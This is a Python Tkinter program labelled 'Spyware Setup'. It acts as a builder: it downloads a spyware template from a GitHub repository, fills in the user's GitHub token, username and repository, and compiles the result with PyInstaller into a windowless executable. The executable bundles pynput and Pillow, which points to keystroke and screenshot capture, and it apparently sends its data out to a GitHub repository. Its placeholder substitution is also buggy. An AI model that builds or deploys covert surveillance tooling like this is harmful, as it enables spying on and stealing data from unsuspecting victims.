import tkinter as tk
from tkinter import messagebox
import requests
import re
import os
import subprocess

# Raw URL for your template file
TEMPLATE_URL = "https://raw.githubusercontent.com/shrijaybaheti/spyware/refs/heads/main/source_code/tempelate.py"

def download_template():
    try:
        response = requests.get(TEMPLATE_URL)
        response.raise_for_status()
        return response.text
    except requests.RequestException as e:
        messagebox.showerror("Download Error", f"Failed to download template: {e}")
        return None

def generate_script(token, username, repo_name, template_content):
    # Replace placeholders with user-provided data
    script_content = template_content.replace("{GITHUB_TOKEN}", token)
    script_content = template_content.replace("{GITHUB_USERNAME}", username)
    script_content = template_content.replace("{GITHUB_REPO}", repo_name)

    # Save the generated script to a file named v5.py
    with open("v5.py", "w") as generated_file:
        generated_file.write(script_content)

def create_executable():
    # Define the command for PyInstaller
    icon_path = r"C:\Users\Shrijay\Desktop\icon.ico"  # Ensure this path is correct
    cmd = (
        f'python -m PyInstaller --onefile '
        f'--hidden-import=requests --hidden-import=pynput '
        f'--hidden-import=Pillow --hidden-import=base64 '
        f'--hidden-import=os --hidden-import=datetime '
        f'--hidden-import=subprocess --hidden-import=threading '
        f'--noconsole --name=v5 v5.py'
    )
    
    # Open PowerShell and run the command
    subprocess.Popen(['powershell.exe', '-NoExit', '-Command', cmd], creationflags=subprocess.CREATE_NEW_CONSOLE)

    messagebox.showinfo("Info", "The executable is being created in a new PowerShell window.")

def on_submit():
    token = entry_token.get().strip()
    username = entry_username.get().strip()
    repo_name = entry_repo.get().strip()

    if not token or not username or not repo_name:
        messagebox.showerror("Input Error", "All fields are required!")
        return

    if not re.match(r"ghp_\w{36}", token):
        messagebox.showerror("Input Error", "Invalid GitHub Token format.")
        return

    template_content = download_template()
    if template_content is None:
        return

    # Generate the Python script with the provided information
    generate_script(token, username, repo_name, template_content)

    # Create the executable
    create_executable()

    # Delete the generated Python file
    if os.path.exists("v5.py"):
        os.remove("v5.py")

# Create the GUI
root = tk.Tk()
root.title("Spyware Setup")

tk.Label(root, text="GitHub Personal Access Token:").pack()
entry_token = tk.Entry(root, show="*", width=40)
entry_token.pack()

tk.Label(root, text="GitHub Username:").pack()
entry_username = tk.Entry(root, width=40)
entry_username.pack()

tk.Label(root, text="GitHub Repository Name:").pack()
entry_repo = tk.Entry(root, width=40)
entry_repo.pack()

tk.Button(root, text="Make Script", command=on_submit).pack(pady=10)

root.mainloop()
